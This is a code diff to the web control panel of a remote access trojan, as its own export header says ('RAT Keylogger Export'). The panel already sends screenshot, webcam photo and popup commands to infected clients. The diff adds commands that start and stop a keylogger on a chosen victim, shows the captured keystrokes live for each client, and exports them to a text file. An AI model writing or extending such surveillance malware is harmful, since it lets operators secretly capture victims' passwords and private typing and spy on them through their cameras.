@@ -62,6 +62,15 @@ function initializeWebSocket() {
         addLogEntry(`Photo received from ${data.client_id}`, 'success');
     });
     
+    socket.on('keylog_data', function(data) {
+        addKeylogData(data);
+    });
+    
+    socket.on('keylog_status', function(data) {
+        updateKeylogStatus(data);
+        addLogEntry(`Keylogger ${data.payload.status} for ${data.client_id}`, 'info');
+    });
+    
     socket.on('popup_response', function(data) {
         addLogEntry(`Popup response from ${data.client_id}: ${JSON.stringify(data.response)}`, 'info');
     });
@@ -84,6 +93,8 @@ function initializeEventHandlers() {
     document.getElementById('cmd-screenshot').addEventListener('click', sendScreenshotCommand);
     document.getElementById('cmd-photo').addEventListener('click', sendPhotoCommand);
     document.getElementById('cmd-popup').addEventListener('click', showPopupConfig);
+    document.getElementById('cmd-keylog-start').addEventListener('click', sendKeylogStartCommand);
+    document.getElementById('cmd-keylog-stop').addEventListener('click', sendKeylogStopCommand);
     document.getElementById('cmd-ping').addEventListener('click', sendPingCommand);
     document.getElementById('send-popup').addEventListener('click', sendPopupCommand);
     
@@ -95,6 +106,10 @@ function initializeEventHandlers() {
     
     // Clear log
     document.getElementById('clear-log').addEventListener('click', clearActivityLog);
+    
+    // Keylogger controls
+    document.getElementById('clear-keylog').addEventListener('click', clearKeylogData);
+    document.getElementById('export-keylog').addEventListener('click', exportKeylogData);
     
     // Refresh clients periodically
     setInterval(refreshClients, 5000);
@@ -223,6 +238,8 @@ function updateCommandButtons() {
     document.getElementById('cmd-screenshot').disabled = !hasClient;
     document.getElementById('cmd-photo').disabled = !hasClient;
     document.getElementById('cmd-popup').disabled = !hasClient;
+    document.getElementById('cmd-keylog-start').disabled = !hasClient;
+    document.getElementById('cmd-keylog-stop').disabled = !hasClient;
     document.getElementById('cmd-ping').disabled = !hasClient;
 }
 
@@ -290,6 +307,40 @@ function sendPopupCommand() {
     })
     .catch(error => {
         addLogEntry(`Error sending popup command: ${error}`, 'error');
+    });
+}
+
+function sendKeylogStartCommand() {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/keylog_start', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ client_id: selectedClient })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error sending keylog start command: ${error}`, 'error');
+    });
+}
+
+function sendKeylogStopCommand() {
+    if (!selectedClient) return;
+    
+    fetch('/api/command/keylog_stop', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ client_id: selectedClient })
+    })
+    .then(response => response.json())
+    .then(data => {
+        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
+    })
+    .catch(error => {
+        addLogEntry(`Error sending keylog stop command: ${error}`, 'error');
     });
 }
 
@@ -438,9 +489,106 @@ function formatTime(timestamp) {
 
 function escapeHtml(unsafe) {
     return unsafe
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
+         .replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#039;");
+}
+
+// Keylogger functions
+function addKeylogData(data) {
+    const container = document.getElementById('keylog-container');
+    
+    // Remove "no data" message
+    if (container.querySelector('p.text-muted')) {
+        container.innerHTML = '';
+    }
+    
+    const timestamp = new Date(data.payload.timestamp * 1000).toLocaleString();
+    const keylogData = escapeHtml(data.payload.data);
+    
+    const entry = document.createElement('div');
+    entry.className = 'keylog-entry';
+    entry.innerHTML = `
+        <div class="keylog-header">
+            <strong>Client:</strong> ${data.client_id} | 
+            <strong>Time:</strong> ${timestamp}
+        </div>
+        <div class="keylog-data">${keylogData.replace(/\n/g, '<br>')}</div>
+        <hr>
+    `;
+    
+    container.appendChild(entry);
+    
+    // Auto-scroll to bottom
+    container.scrollTop = container.scrollHeight;
+    
+    addLogEntry(`Keylog data received from ${data.client_id}`, 'info');
+}
+
+function updateKeylogStatus(data) {
+    const statusBadge = document.getElementById('keylog-status');
+    const status = data.payload.status;
+    
+    if (status === 'started') {
+        statusBadge.textContent = 'Running';
+        statusBadge.className = 'badge bg-success me-2';
+        
+        // Enable stop button, disable start button
+        document.getElementById('cmd-keylog-start').disabled = true;
+        document.getElementById('cmd-keylog-stop').disabled = false;
+    } else if (status === 'stopped') {
+        statusBadge.textContent = 'Stopped';
+        statusBadge.className = 'badge bg-secondary me-2';
+        
+        // Enable start button, disable stop button  
+        document.getElementById('cmd-keylog-start').disabled = false;
+        document.getElementById('cmd-keylog-stop').disabled = true;
+    } else {
+        statusBadge.textContent = 'Not Running';
+        statusBadge.className = 'badge bg-secondary me-2';
+        
+        // Reset button states
+        updateCommandButtons();
+    }
+}
+
+function clearKeylogData() {
+    const container = document.getElementById('keylog-container');
+    container.innerHTML = '<p class="text-muted">Keylogger data will appear here when started...</p>';
+    addLogEntry('Keylog data cleared', 'info');
+}
+
+function exportKeylogData() {
+    const container = document.getElementById('keylog-container');
+    const entries = container.querySelectorAll('.keylog-entry');
+    
+    if (entries.length === 0) {
+        addLogEntry('No keylog data to export', 'warning');
+        return;
+    }
+    
+    let exportData = 'RAT Keylogger Export\n';
+    exportData += '===================\n\n';
+    
+    entries.forEach(entry => {
+        const header = entry.querySelector('.keylog-header').textContent;
+        const data = entry.querySelector('.keylog-data').textContent;
+        exportData += header + '\n';
+        exportData += data + '\n\n';
+    });
+    
+    // Create and download file
+    const blob = new Blob([exportData], { type: 'text/plain' });
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `keylog_export_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    window.URL.revokeObjectURL(url);
+    document.body.removeChild(a);
+    
+    addLogEntry('Keylog data exported', 'success');
 } 
